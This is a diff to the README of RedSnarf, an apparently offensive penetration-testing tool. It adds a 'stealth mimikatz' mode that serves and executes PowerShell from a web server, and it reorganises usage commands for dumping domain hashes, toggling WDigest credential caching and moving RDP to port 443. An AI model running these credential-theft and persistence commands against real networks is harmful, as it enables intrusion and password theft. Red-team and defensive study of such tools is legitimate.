@@ -28,6 +28,7 @@ o	Credsfile will accept a mix of pwdump, fgdump and plain text username and pass
 •	Enable/Disable RDP on a remote machine.
 •	Enable/Disable NLA on a remote machine.
 •	Find where users are logged in on remote machines.
+•	Stealth mimikatz added.
 
 RedSnarf Usage
 =======================
@@ -38,7 +39,7 @@ CredRetrieve 7 - https://github.com/Neohapsis/credRetrieve7
 Lsass Retrieval using procdump - https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
 Netaddr (0.7.12) - easy_install install netaddr
 Termcolor (1.1.0) - easy_install termcolor
-dos2unix - used with parsing Mimikatz info locally 
+iconv - used with parsing Mimikatz info locally 
 
 Show Help
 ./redsnarf.py -h
@@ -77,7 +78,6 @@ Spray Hashes across a network range
 Retrieve Hashes across a network range domain login
 ./redsnarf.py -H range=10.0.0.1/24 -C credsfile -D yourdomain.com
 
-
 Retrieve Domain Hashes
 =======================
 
@@ -87,6 +87,9 @@ Retrieve Hashes using drsuapi method (Quickest)
 Retrieve Hashes using NTDSUtil
 ./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -n y
 
+Stealth Mimikatz (spins a web server - serves powershell and executes
+=======================
+./redsnarf.py -H ip=192.168.198.136 -Sy -sy
 
 Information Gathering
 =======================
@@ -137,8 +140,6 @@ Disable UseLogonCredential Wdigest registry value on a machine using domain admi
 Query UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W q
 
-
-
 RDP
 =======================
 
@@ -152,7 +153,18 @@ Disable RDP on a machine using domain administrator credentials
 Query RDP status on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R q
 
+Change RDP Port from 3389 to 443 - Change RDP Port to 443 on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t e
+
+Change RDP Port to default of 3389 on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t d
+
+Query RDP Port Value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t q
+
 NLA
+=======================
+
 Enable NLA on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r e
 
@@ -161,13 +173,3 @@ Disable NLA on a machine using domain administrator credentials
 
 Query NLA status on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r q
-
-Change RDP Port from 3389 to 443
-Change RDP Port to 443 on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t e
-
-Change RDP Port to default of 3389 on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t d
-
-Query RDP Port Value on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t q
